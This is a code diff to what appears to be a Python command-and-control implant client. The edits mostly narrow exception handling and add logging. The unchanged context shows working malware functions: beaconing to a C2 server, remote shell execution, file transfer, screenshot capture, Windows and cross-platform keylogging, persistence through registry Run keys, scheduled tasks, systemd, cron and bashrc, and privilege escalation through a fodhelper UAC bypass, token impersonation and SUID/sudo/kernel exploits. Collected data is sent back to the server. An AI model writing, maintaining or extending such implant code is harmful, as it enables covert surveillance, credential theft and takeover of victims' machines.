@@ -6,10 +6,12 @@ and autonomous operation capabilities.
 """
 
 import asyncio
+import json
 import logging
 import os
 import platform
 import random
+import socket
 import time
 from typing import Any, Dict, List, Optional
 
@@ -122,7 +124,7 @@ class C2Client(BaseC2):
             # Start main operation loop
             await self._main_operation_loop()
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Failed to start C2 client: {e}")
             await self.stop()
             raise
@@ -137,12 +139,12 @@ class C2Client(BaseC2):
             if self.current_protocol:
                 try:
                     await self.current_protocol['handler'].disconnect()
-                except Exception as e:
+                except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                     self.logger.error(f"Error disconnecting: {e}")
 
             self.logger.info("C2 client stopped successfully")
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Error stopping C2 client: {e}")
 
     async def _establish_connection(self):
@@ -162,7 +164,7 @@ class C2Client(BaseC2):
                         self.logger.info(f"Successfully connected via {protocol['name']}")
                         return
 
-            except Exception as e:
+            except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.warning(f"Failed to connect via {protocol['name']}: {e}")
                 self.stats['protocol_failures'] += 1
 
@@ -197,7 +199,7 @@ class C2Client(BaseC2):
                 self.logger.error("Server registration failed")
                 return None
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Registration failed: {e}")
             return None
 
@@ -235,7 +237,7 @@ class C2Client(BaseC2):
                 # Wait until next beacon time
                 await asyncio.sleep(beacon_time)
 
-            except Exception as e:
+            except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.error(f"Error in main operation loop: {e}")
                 await asyncio.sleep(30)  # Brief pause before retry
 
@@ -263,7 +265,7 @@ class C2Client(BaseC2):
             else:
                 return False
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Beacon failed: {e}")
             return False
 
@@ -289,7 +291,7 @@ class C2Client(BaseC2):
                 command = response.get('command', {})
                 await self._execute_direct_command(command)
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Error processing server response: {e}")
 
     async def _process_pending_tasks(self):
@@ -304,7 +306,7 @@ class C2Client(BaseC2):
                 await self._send_task_result(task['task_id'], result, True)
                 self.stats['successful_tasks'] += 1
 
-            except Exception as e:
+            except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                 self.logger.error(f"Task execution failed: {e}")
                 await self._send_task_result(task['task_id'], str(e), False)
                 self.stats['failed_tasks'] += 1
@@ -353,7 +355,7 @@ class C2Client(BaseC2):
 
             await self.current_protocol['handler'].send_message(result_data)
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Failed to send task result: {e}")
 
     async def _perform_autonomous_activities(self):
@@ -369,7 +371,7 @@ class C2Client(BaseC2):
                 if random.random() < 0.05:  # 5% chance
                     await self._autonomous_screenshot()
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Error in autonomous activities: {e}")
 
     async def _calculate_beacon_time(self) -> float:
@@ -401,12 +403,12 @@ class C2Client(BaseC2):
                         self.logger.info(f"Successfully failed over to {protocol['name']}")
                         return
 
-                except Exception as e:
+                except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                     self.logger.warning(f"Failover to {protocol['name']} failed: {e}")
 
             self.logger.error("All protocol failover attempts failed")
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Error during protocol failover: {e}")    # Task execution methods
     async def _execute_shell_command(self, command: str) -> str:
         """Execute shell command and return output."""
@@ -420,9 +422,11 @@ class C2Client(BaseC2):
                 timeout=30
             )
             return f"Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
-        except subprocess.TimeoutExpired:
+        except subprocess.TimeoutExpired as e:
+            self.logger.error("subprocess.TimeoutExpired in c2_client.py: %s", e)
             return "Command timed out after 30 seconds"
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return f"Command execution failed: {e}"
 
     async def _download_file(self, remote_path: str) -> Dict[str, Any]:
@@ -443,7 +447,8 @@ class C2Client(BaseC2):
             else:
                 return {'success': False, 'error': 'File not found'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     async def _upload_file(self, local_path: str, file_data: bytes) -> Dict[str, Any]:
@@ -464,7 +469,8 @@ class C2Client(BaseC2):
                 'size': len(file_data)
             }
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     async def _take_screenshot(self) -> Dict[str, Any]:
@@ -488,7 +494,8 @@ class C2Client(BaseC2):
                 screenshot_data = img_buffer.getvalue()
                 screenshot_method = 'PIL'
 
-            except ImportError:
+            except ImportError as e:
+                self.logger.error("Import error in c2_client.py: %s", e)
                 # Method 2: PyQt5 screenshot
                 try:
                     import sys
@@ -509,7 +516,8 @@ class C2Client(BaseC2):
                     screenshot_data = buffer.getvalue()
                     screenshot_method = 'PyQt5'
 
-                except ImportError:
+                except ImportError as e:
+                    self.logger.error("Import error in c2_client.py: %s", e)
                     # Method 3: System-specific commands
                     import subprocess
                     import tempfile
@@ -544,7 +552,8 @@ class C2Client(BaseC2):
                                 try:
                                     subprocess.run(tool, check=True, stderr=subprocess.DEVNULL)
                                     break
-                                except (subprocess.CalledProcessError, FileNotFoundError):
+                                except (subprocess.CalledProcessError, FileNotFoundError) as e:
+                                    self.logger.error("(subprocess.CalledProcessError, FileNotFoundError) in c2_client.py: %s", e)
                                     continue
 
                         # Read screenshot data
@@ -565,8 +574,8 @@ class C2Client(BaseC2):
                         width, height = screenshot.size
                     elif screenshot_method == 'PyQt5':
                         width, height = screenshot.width(), screenshot.height()
-                except:
-                    pass
+                except Exception:
+                    self.logger.debug("Error getting screenshot dimensions")
 
                 return {
                     'success': True,
@@ -583,7 +592,8 @@ class C2Client(BaseC2):
                     'error': 'No screenshot method available or screenshot capture failed'
                 }
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     async def _start_keylogging(self) -> Dict[str, Any]:
@@ -626,7 +636,7 @@ class C2Client(BaseC2):
                         if len(self._keylog_buffer) > 10000:
                             self._keylog_buffer = self._keylog_buffer[-5000:]
 
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                         self.logger.debug(f"Keylog capture error: {e}")
 
                 # Start listener in separate thread
@@ -649,6 +659,7 @@ class C2Client(BaseC2):
                         import threading
                         try:
                             from ctypes import wintypes
+
                             # Ensure required types are available
                             if not hasattr(wintypes, 'WPARAM'):
                                 wintypes.WPARAM = ctypes.c_ulong
@@ -667,7 +678,8 @@ class C2Client(BaseC2):
                                               ("pt_x", ctypes.c_long),
                                               ("pt_y", ctypes.c_long)]
                                 wintypes.MSG = MSG
-                        except (ImportError, AttributeError):
+                        except (ImportError, AttributeError) as e:
+                            self.logger.error("(ImportError, AttributeError) in c2_client.py: %s", e)
                             # Fallback Windows types for cross-platform compatibility
                             class FallbackWintypes:
                                 """Fallback Windows types for cross-platform compatibility."""
@@ -718,7 +730,7 @@ class C2Client(BaseC2):
                                     if len(self._keylog_buffer) > 10000:
                                         self._keylog_buffer = self._keylog_buffer[-5000:]
 
-                                except Exception as e:
+                                except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                                     self.logger.debug(f"Windows keylog error: {e}")
 
                             return user32.CallNextHookEx(None, nCode, wParam, lParam)
@@ -745,7 +757,7 @@ class C2Client(BaseC2):
                                             break
                                         user32.TranslateMessage(ctypes.byref(msg))
                                         user32.DispatchMessageW(ctypes.byref(msg))
-                                except Exception as e:
+                                except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
                                     self.logger.debug(f"Message loop error: {e}")
 
                             self._keylogger_thread = threading.Thread(target=message_loop)
@@ -764,7 +776,7 @@ class C2Client(BaseC2):
                                 'error': 'Failed to install Windows keyboard hook'
                             }
 
-                    except Exception as windows_error:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as windows_error:
                         return {
                             'success': False,
                             'error': f'Windows keylogging failed: {windows_error}'
@@ -775,7 +787,8 @@ class C2Client(BaseC2):
                         'error': 'No keylogging method available for this platform'
                     }
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     async def _stop_keylogging(self) -> Dict[str, Any]:
@@ -795,8 +808,8 @@ class C2Client(BaseC2):
                 try:
                     self._keylogger_listener.stop()
                     del self._keylogger_listener
-                except:
-                    pass
+                except Exception:
+                    self.logger.debug("Error stopping keylogger listener")
 
             # Unhook Windows API
             if hasattr(self, '_hook_id') and os.name == 'nt':
@@ -806,8 +819,8 @@ class C2Client(BaseC2):
                     user32.UnhookWindowsHookEx(self._hook_id)
                     del self._hook_id
                     del self._hook_proc
-                except:
-                    pass
+                except Exception:
+                    self.logger.debug("Error unhooking Windows API")
 
             # Get captured keylog data
             captured_keys = len(getattr(self, '_keylog_buffer', []))
@@ -819,7 +832,8 @@ class C2Client(BaseC2):
                 'timestamp': time.time()
             }
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     async def _get_process_list(self) -> List[Dict[str, Any]]:
@@ -831,12 +845,13 @@ class C2Client(BaseC2):
             for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                 try:
                     processes.append(proc.info)
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    pass
+                except (psutil.NoSuchProcess, psutil.AccessDenied) as e:
+                    self.logger.error("(psutil.NoSuchProcess, psutil.AccessDenied) in c2_client.py: %s", e)
 
             return processes
 
-        except ImportError:
+        except ImportError as e:
+            self.logger.error("Import error in c2_client.py: %s", e)
             # Fallback without psutil
             import subprocess
             try:
@@ -845,10 +860,12 @@ class C2Client(BaseC2):
                 else:
                     result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                 return {'raw_output': result.stdout}
-            except Exception as e:
+            except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                 return {'error': str(e)}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'error': str(e)}
 
     async def _gather_system_info(self) -> Dict[str, Any]:
@@ -869,12 +886,13 @@ class C2Client(BaseC2):
             try:
                 import socket
                 info['ip_address'] = socket.gethostbyname(socket.gethostname())
-            except:
-                pass
+            except Exception:
+                self.logger.debug("Error getting IP address")
 
             return info
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'error': str(e)}
 
     async def _network_scan(self, target: str) -> Dict[str, Any]:
@@ -901,8 +919,8 @@ class C2Client(BaseC2):
                     if result == 0:
                         results['open_ports'].append(port)
                     sock.close()
-                except:
-                    pass
+                except Exception:
+                    self.logger.debug(f"Error scanning port {port}")
 
             threads = []
             for port in common_ports:
@@ -916,7 +934,8 @@ class C2Client(BaseC2):
             results['scan_complete'] = True
             return results
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'error': str(e)}
 
     async def _install_persistence(self, data: Dict[str, Any]) -> Dict[str, Any]:
@@ -957,7 +976,8 @@ class C2Client(BaseC2):
                             'registry_key': f"HKCU\\{key_path}\\{service_name}",
                             'executable': executable_path
                         }
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'Registry persistence failed: {e}'
 
                 elif method == 'startup_folder':
@@ -975,7 +995,8 @@ class C2Client(BaseC2):
                             'startup_file': bat_file,
                             'executable': executable_path
                         }
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'Startup folder persistence failed: {e}'
 
                 elif method == 'task_scheduler':
@@ -1000,8 +1021,10 @@ class C2Client(BaseC2):
                             'trigger': 'onlogon'
                         }
                     except subprocess.CalledProcessError as e:
+                        self.logger.error("subprocess.CalledProcessError in c2_client.py: %s", e)
                         results['message'] = f'Task scheduler persistence failed: {e.stderr}'
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'Task scheduler persistence failed: {e}'
 
             elif os_type == 'linux':
@@ -1038,7 +1061,8 @@ WantedBy=multi-user.target
                             'service_name': f'{service_name.lower()}.service',
                             'executable': executable_path
                         }
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'systemd persistence failed: {e}'
 
                 elif method == 'cron':
@@ -1060,7 +1084,8 @@ WantedBy=multi-user.target
                             'cron_entry': cron_entry,
                             'executable': executable_path
                         }
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'Cron persistence failed: {e}'
 
                 elif method == 'bashrc':
@@ -1082,7 +1107,8 @@ WantedBy=multi-user.target
                             'bashrc_file': bashrc_path,
                             'executable': executable_path
                         }
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'bashrc persistence failed: {e}'
 
             else:
@@ -1091,7 +1117,7 @@ WantedBy=multi-user.target
             self.logger.info(f"Persistence installation: {results['message']}")
             return results
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Persistence installation failed: {e}")
             return {'success': False, 'error': str(e), 'timestamp': time.time()}
 
@@ -1132,7 +1158,8 @@ WantedBy=multi-user.target
                             results['method'] = 'uac_bypass_fodhelper'
                         else:
                             results['message'] = bypass_result.get('message', 'UAC bypass failed')
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'UAC bypass failed: {e}'
 
                 elif method == 'token_impersonation':
@@ -1143,7 +1170,8 @@ WantedBy=multi-user.target
                             results.update(token_result)
                         else:
                             results['message'] = token_result.get('message', 'Token impersonation failed')
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'Token impersonation failed: {e}'
 
                 elif method == 'service_exploit':
@@ -1154,7 +1182,8 @@ WantedBy=multi-user.target
                             results.update(service_result)
                         else:
                             results['message'] = service_result.get('message', 'Service exploit failed')
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'Service exploit failed: {e}'
 
             elif os_type == 'linux':
@@ -1167,7 +1196,8 @@ WantedBy=multi-user.target
                             results['method'] = 'sudo_exploit'
                         else:
                             results['message'] = sudo_result.get('message', 'Sudo exploit failed')
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'Sudo exploit failed: {e}'
 
                 elif method == 'suid_exploit':
@@ -1178,7 +1208,8 @@ WantedBy=multi-user.target
                             results.update(suid_result)
                         else:
                             results['message'] = suid_result.get('message', 'SUID exploit failed')
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'SUID exploit failed: {e}'
 
                 elif method == 'kernel_exploit':
@@ -1189,7 +1220,8 @@ WantedBy=multi-user.target
                             results.update(kernel_result)
                         else:
                             results['message'] = kernel_result.get('message', 'Kernel exploit failed')
-                    except Exception as e:
+                    except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+                        self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
                         results['message'] = f'Kernel exploit failed: {e}'
 
             else:
@@ -1204,7 +1236,7 @@ WantedBy=multi-user.target
             self.logger.info(f"Privilege escalation: {results['message']}")
             return results
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Privilege escalation failed: {e}")
             return {'success': False, 'error': str(e), 'timestamp': time.time()}
 
@@ -1237,7 +1269,7 @@ WantedBy=multi-user.target
                     privileges['is_admin'] = False
                 privileges['username'] = os.environ.get('USER', 'unknown')
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Error checking privileges: {e}")
 
         return privileges
@@ -1276,7 +1308,8 @@ WantedBy=multi-user.target
                 }
             }
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'message': f'fodhelper UAC bypass failed: {e}'}
 
     def _windows_token_impersonation(self) -> Dict[str, Any]:
@@ -1286,7 +1319,8 @@ WantedBy=multi-user.target
             from ctypes import wintypes
             if not hasattr(wintypes, 'HANDLE'):
                 wintypes.HANDLE = ctypes.c_void_p
-        except (ImportError, AttributeError):
+        except (ImportError, AttributeError) as e:
+            self.logger.error("(ImportError, AttributeError) in c2_client.py: %s", e)
             class MockWintypes:
                 """Mock Windows types for non-Windows platforms."""
                 HANDLE = ctypes.c_void_p
@@ -1331,7 +1365,8 @@ WantedBy=multi-user.target
 
             return {'success': False, 'message': 'Required privileges not available for token impersonation'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'message': f'Token impersonation failed: {e}'}
 
     def _check_privilege(self, token, privilege_name: str) -> bool:
@@ -1378,13 +1413,14 @@ WantedBy=multi-user.target
                         if hasattr(os, 'getuid'):
                             return os.getuid() == 0
                         return False
-                except:
+                except Exception:
+                    self.logger.debug("Error checking admin privileges")
                     return False
 
             # Conservative default for other privileges
             return False
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.debug(f"Error checking privilege {privilege_name}: {e}")
             return False
 
@@ -1426,7 +1462,8 @@ WantedBy=multi-user.target
             else:
                 return {'success': False, 'message': 'Failed to query services'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'message': f'Service exploit failed: {e}'}
 
     def _linux_sudo_exploit(self) -> Dict[str, Any]:
@@ -1451,7 +1488,8 @@ WantedBy=multi-user.target
 
             return {'success': False, 'message': 'No sudo vulnerabilities found'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'message': f'Sudo exploit failed: {e}'}
 
     def _linux_suid_exploit(self) -> Dict[str, Any]:
@@ -1481,7 +1519,8 @@ WantedBy=multi-user.target
 
             return {'success': False, 'message': 'No exploitable SUID binaries found'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'message': f'SUID exploit failed: {e}'}
 
     def _linux_kernel_exploit(self) -> Dict[str, Any]:
@@ -1506,7 +1545,8 @@ WantedBy=multi-user.target
 
             return {'success': False, 'message': f'No known vulnerabilities for kernel {kernel_version}'}
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'success': False, 'message': f'Kernel exploit failed: {e}'}
 
     async def _get_system_status(self) -> Dict[str, Any]:
@@ -1522,12 +1562,14 @@ WantedBy=multi-user.target
                 'timestamp': time.time()
             }
 
-        except ImportError:
+        except ImportError as e:
+            self.logger.error("Import error in c2_client.py: %s", e)
             return {
                 'timestamp': time.time(),
                 'note': 'psutil not available for detailed stats'
             }
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
+            self.logger.error("(OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) in c2_client.py: %s", e)
             return {'error': str(e)}
 
     async def _autonomous_info_gathering(self):
@@ -1544,7 +1586,7 @@ WantedBy=multi-user.target
 
             await self.current_protocol['handler'].send_message(info_data)
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Autonomous info gathering failed: {e}")
 
     async def _autonomous_screenshot(self):
@@ -1561,7 +1603,7 @@ WantedBy=multi-user.target
 
             await self.current_protocol['handler'].send_message(screenshot_data)
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Autonomous screenshot failed: {e}")
 
     async def _update_config(self, new_config: Dict[str, Any]):
@@ -1586,7 +1628,7 @@ WantedBy=multi-user.target
 
             self.logger.info("Configuration updated successfully")
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Config update failed: {e}")
 
     async def _execute_direct_command(self, command: Dict[str, Any]):
@@ -1602,7 +1644,7 @@ WantedBy=multi-user.target
             result = await self._execute_task(task)
             await self._send_task_result(task['task_id'], result, True)
 
-        except Exception as e:
+        except (OSError, IOError, socket.error, ConnectionError, TimeoutError, AttributeError, ValueError, TypeError, RuntimeError, json.JSONDecodeError) as e:
             self.logger.error(f"Direct command execution failed: {e}")
 
     def _get_capabilities(self) -> List[str]:
@@ -1623,8 +1665,8 @@ WantedBy=multi-user.target
                 capabilities.append('advanced_system_monitoring')
             if importlib.util.find_spec("PIL") is not None:
